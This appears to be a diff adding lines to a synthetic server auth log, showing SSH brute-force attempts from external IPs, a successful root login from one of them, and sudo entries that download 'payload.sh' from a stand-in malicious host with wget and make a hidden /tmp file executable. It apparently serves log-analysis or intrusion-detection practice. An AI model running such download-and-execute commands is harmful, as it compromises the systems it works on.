@@ -1,5 +1,37 @@
 May  6 09:12:01 server sshd[1023]: Accepted password for john from 192.168.1.10 port 53422 ssh2
+May  6 09:13:15 server sshd[1031]: Accepted password for lisa from 192.168.1.20 port 61234 ssh2
+May  6 09:14:02 server sshd[1035]: Failed password for invalid user admin from 185.220.101.12 port 41234 ssh2
+May  6 09:14:03 server sshd[1035]: Failed password for invalid user root from 185.220.101.12 port 41234 ssh2
+May  6 09:14:04 server sshd[1035]: Failed password for invalid user test from 185.220.101.12 port 41234 ssh2
+May  6 09:14:05 server sshd[1035]: Failed password for invalid user ubuntu from 185.220.101.12 port 41234 ssh2
+May  6 09:14:06 server sshd[1035]: Failed password for invalid user deploy from 185.220.101.12 port 41234 ssh2
+May  6 09:14:07 server sshd[1035]: Failed password for invalid user git from 185.220.101.12 port 41234 ssh2
+May  6 09:14:08 server sshd[1035]: Failed password for invalid user oracle from 185.220.101.12 port 41234 ssh2
+May  6 09:14:09 server sshd[1035]: Failed password for invalid user postgres from 185.220.101.12 port 41234 ssh2
+May  6 09:14:10 server sshd[1035]: Failed password for invalid user mysql from 185.220.101.12 port 41234 ssh2
+May  6 09:14:11 server sshd[1035]: Failed password for invalid user ftp from 185.220.101.12 port 41234 ssh2
 May  6 09:15:43 server sshd[1044]: Failed password for invalid user admin from 185.220.101.12 port 41234 ssh2
 May  6 09:15:44 server sshd[1044]: Failed password for invalid user root from 185.220.101.12 port 41234 ssh2
+May  6 09:15:45 server sshd[1044]: Failed password for invalid user test from 185.220.101.12 port 41234 ssh2
 May  6 09:16:01 server sshd[1045]: Accepted password for root from 185.220.101.12 port 41234 ssh2
 May  6 09:16:05 server sudo: root : TTY=pts/0 ; PWD=/root ; COMMAND=/bin/bash
+May  6 09:17:30 server sudo: root : TTY=pts/0 ; PWD=/root ; COMMAND=/usr/bin/wget http://malicious.ru/payload.sh
+May  6 09:18:00 server sudo: root : TTY=pts/0 ; PWD=/tmp ; COMMAND=/bin/chmod +x /tmp/.x1
+May  6 09:20:00 server sshd[1078]: Accepted password for john from 192.168.1.10 port 53500 ssh2
+May  6 09:22:10 server sudo: john : TTY=pts/1 ; PWD=/home/john ; COMMAND=/usr/bin/git pull
+May  6 09:25:00 server sshd[1090]: Failed password for invalid user admin from 203.0.113.55 port 22345 ssh2
+May  6 09:25:01 server sshd[1090]: Failed password for invalid user root from 203.0.113.55 port 22345 ssh2
+May  6 09:25:02 server sshd[1090]: Failed password for invalid user pi from 203.0.113.55 port 22345 ssh2
+May  6 09:25:03 server sshd[1090]: Failed password for invalid user vagrant from 203.0.113.55 port 22345 ssh2
+May  6 09:25:04 server sshd[1090]: Failed password for invalid user user from 203.0.113.55 port 22345 ssh2
+May  6 09:30:00 server sshd[1100]: Accepted password for lisa from 192.168.1.20 port 62000 ssh2
+May  6 09:31:00 server sudo: lisa : TTY=pts/2 ; PWD=/home/lisa ; COMMAND=/usr/bin/apt update
+May  6 09:45:00 server sshd[1120]: Failed password for invalid user admin from 198.51.100.77 port 55123 ssh2
+May  6 09:45:01 server sshd[1120]: Failed password for invalid user admin from 198.51.100.77 port 55124 ssh2
+May  6 09:45:02 server sshd[1120]: Failed password for invalid user admin from 198.51.100.77 port 55125 ssh2
+May  6 09:50:00 server sshd[1130]: Accepted password for deploy from 192.168.1.30 port 49000 ssh2
+May  6 09:51:00 server sudo: deploy : TTY=pts/3 ; PWD=/var/www ; COMMAND=/usr/bin/systemctl restart nginx
+May  6 10:00:00 server sshd[1140]: Failed password for invalid user root from 185.220.101.12 port 41300 ssh2
+May  6 10:00:01 server sshd[1140]: Failed password for invalid user admin from 185.220.101.12 port 41301 ssh2
+May  6 10:00:02 server sshd[1140]: Accepted password for deploy from 185.220.101.12 port 41302 ssh2
+May  6 10:00:05 server sudo: deploy : TTY=pts/4 ; PWD=/var/www ; COMMAND=/bin/bash
